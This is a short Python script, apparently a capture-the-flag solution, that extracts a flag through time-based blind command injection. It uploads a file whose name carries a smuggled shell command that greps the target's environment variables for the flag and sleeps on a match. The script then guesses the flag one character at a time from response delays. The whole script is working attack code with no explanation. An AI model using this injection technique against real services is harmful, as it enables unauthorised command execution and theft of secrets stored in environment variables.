import requests
import time

url = "https://CHALLENGE-INSTANCE/scan"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}-!@#$%^&*()+=[]{}:;\",.?/~|\\<>"
flag = "offsec{"

print("Starting blind extraction...")

found = False
while not found:
    for char in charset:
        test_flag = flag + char
        payload = f"file|printenv | grep -F 'FLAG={test_flag}' && sleep 5"
        files = {
            'specimen': (payload, b'hello', 'application/x-python')
        }
        start_time = time.time()
        try:
            requests.post(url, files=files, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")
            continue
        # elapsied time that request took to come back
        elapsed = time.time() - start_time
        if elapsed > 3:
            flag += char
            print(f"Flag found: {flag}")
            if flag.endswith("}"):
                print(f"Full flag: {flag}")
                found = True
            break